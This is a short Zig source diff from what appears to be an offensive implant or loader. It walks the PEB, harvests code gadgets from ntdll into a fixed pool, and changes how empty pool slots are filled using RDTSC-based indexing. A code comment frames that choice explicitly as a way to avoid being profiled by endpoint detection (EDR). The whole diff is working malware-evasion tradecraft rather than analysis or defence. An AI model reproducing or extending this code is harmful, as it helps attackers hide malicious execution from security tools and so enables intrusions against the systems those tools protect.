@@ -6,7 +6,7 @@ const peb_walk = @import("../types/peb_walk.zig");
 pub const POOL_SIZE: usize = 64;
 const POOL_MASK: usize = POOL_SIZE - 1;
 
-pub export var gadget_pool: [POOL_SIZE]usize = undefined;
+pub export var gadget_pool: [POOL_SIZE]usize = [_]usize{0} ** POOL_SIZE;
 pub export var gadget_pool_len: u32 = 0;
 
 const TextBounds = struct { start: usize, end: usize };
@@ -51,6 +51,10 @@ pub fn initialize() bool {
     const n = scanModule(ntdll, gadget_pool[0..]);
     gadget_pool_len = @intCast(n);
     if (gadget_pool_len > 0 and gadget_pool_len < POOL_SIZE) {
+        // ponytail: fill remaining slots by cycling found gadgets.
+        // RDTSC & 63 gives index 0..63; duplicates bias lower indices
+        // when pool < 64. Shuffle with Fisher-Yates if biasing matters
+        // under active EDR profiling.
         var i: usize = gadget_pool_len;
         while (i < POOL_SIZE) : (i += 1) {
             gadget_pool[i] = gadget_pool[i % gadget_pool_len];
